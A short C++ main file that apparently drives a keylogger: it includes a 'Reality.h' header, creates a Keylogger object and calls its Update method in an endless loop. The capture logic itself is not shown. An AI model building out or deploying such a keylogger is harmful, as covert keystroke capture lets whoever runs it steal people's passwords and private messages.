#include "Reality.h"

#include <iostream>

int	main(int argc, char** argv) {
	Keylogger kl;

	while(true) {
		kl.Update();
	}

	return 0;
}